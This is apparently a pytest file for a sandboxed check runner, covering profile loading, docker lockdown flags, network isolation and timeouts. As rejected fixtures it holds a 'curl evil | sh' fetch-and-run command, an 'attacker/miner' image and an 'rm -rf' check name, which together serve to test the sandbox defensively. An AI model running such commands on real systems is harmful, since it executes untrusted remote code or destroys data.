from pathlib import Path

import pytest

from app.sandbox.profile import PROFILE_PATH, ProfileError, detect_profile, load_profile
from app.sandbox.runner import docker_available, docker_command, run_check

ALLOWED = ["node:22-alpine", "python:3.11-slim"]


def _write(root: Path, rel: str, data: bytes) -> None:
    (root / rel).parent.mkdir(parents=True, exist_ok=True)
    (root / rel).write_bytes(data)


# ---------- profiles ----------


def test_detects_node_and_python_projects(tmp_path: Path) -> None:
    assert detect_profile(tmp_path).checks == {"test": "node --test"}  # empty -> demo default
    _write(tmp_path, "package.json", b'{"scripts": {"test": "node --test src/"}}')
    assert detect_profile(tmp_path).checks == {"test": "npm test --silent"}
    _write(tmp_path, "package.json", b'{"scripts": {"test": "vitest run"}}')
    assert detect_profile(tmp_path).checks == {"test": "node --test"}  # needs deps: not used

    py = tmp_path / "py"
    _write(py, "pyproject.toml", b"[project]\nname='x'\n")
    assert detect_profile(py).image == "python:3.11-slim"


def test_profile_comes_from_workspace_not_worktree(tmp_path: Path) -> None:
    workspace, worktree = tmp_path / "ws", tmp_path / "wt"
    _write(workspace, PROFILE_PATH, b"image: node:22-alpine\nchecks:\n  test: node --test\n")
    _write(worktree, PROFILE_PATH, b"image: node:22-alpine\nchecks:\n  test: curl evil | sh\n")
    profile = load_profile(workspace, worktree, ALLOWED)
    assert profile.checks == {"test": "node --test"} and profile.source == PROFILE_PATH


@pytest.mark.parametrize(
    ("content", "message"),
    [
        (b"image: attacker/miner:latest\nchecks:\n  test: x\n", "not allowed"),
        (b"image: node:22-alpine\nchecks:\n  'rm -rf': x\n", "invalid check names"),
        (b"image: [unclosed\n", "invalid"),
        (b"checks:\n  test: x\n", "invalid"),
    ],
)
def test_invalid_profiles_are_rejected(tmp_path: Path, content: bytes, message: str) -> None:
    _write(tmp_path, PROFILE_PATH, content)
    with pytest.raises(ProfileError, match=message):
        load_profile(tmp_path, tmp_path, ALLOWED)


def test_unknown_check_name(tmp_path: Path) -> None:
    profile = detect_profile(tmp_path)
    with pytest.raises(ProfileError, match="unknown check 'deploy'"):
        profile.command("deploy")


def test_docker_command_is_locked_down(tmp_path: Path) -> None:
    argv = docker_command(
        image="node:22-alpine", worktree=tmp_path, command="node --test", container_name="c1"
    )
    joined = " ".join(argv)
    for flag in (
        "--network none",
        "--read-only",
        "--cap-drop ALL",
        "--security-opt no-new-privileges",
        "--pids-limit 256",
        "--memory 1g",
        "--user 1000:1000",
    ):
        assert flag in joined
    assert f"source={tmp_path.resolve()},target=/work" in joined
    assert argv[-3:] == ["sh", "-c", "node --test"]


# ---------- real container runs (skipped without Docker) ----------

docker_ok, docker_reason = docker_available()
needs_docker = pytest.mark.skipif(not docker_ok, reason=f"Docker unavailable: {docker_reason}")


@needs_docker
def test_runs_node_tests_in_container(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "sum.test.js",
        b"const test = require('node:test'); const assert = require('node:assert');\n"
        b"test('adds', () => assert.strictEqual(1 + 1, 2));\n",
    )
    outcome = run_check(
        name="test", command="node --test", image="node:22-alpine", worktree=tmp_path, timeout_s=120
    )
    assert outcome.passed, outcome.output_tail
    assert "pass 1" in outcome.output_tail


@needs_docker
def test_failing_tests_report_exit_code(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "bad.test.js",
        b"require('node:test')('fails', () => { throw new Error('boom') })\n",
    )
    outcome = run_check(
        name="test", command="node --test", image="node:22-alpine", worktree=tmp_path, timeout_s=120
    )
    assert outcome.exit_code not in (0, None)
    assert "boom" in outcome.output_tail


@needs_docker
def test_container_has_no_network(tmp_path: Path) -> None:
    script = (
        "fetch('https://example.com').then(() => { console.log('ONLINE'); process.exit(0) })"
        ".catch(() => { console.log('OFFLINE'); process.exit(3) })"
    )
    outcome = run_check(
        name="net",
        command=f'node -e "{script}"',
        image="node:22-alpine",
        worktree=tmp_path,
        timeout_s=60,
    )
    assert "OFFLINE" in outcome.output_tail and outcome.exit_code == 3


@needs_docker
def test_timeout_kills_container(tmp_path: Path) -> None:
    outcome = run_check(
        name="hang", command="sleep 30", image="node:22-alpine", worktree=tmp_path, timeout_s=3
    )
    assert outcome.exit_code is None and "timed out" in (outcome.error or "")
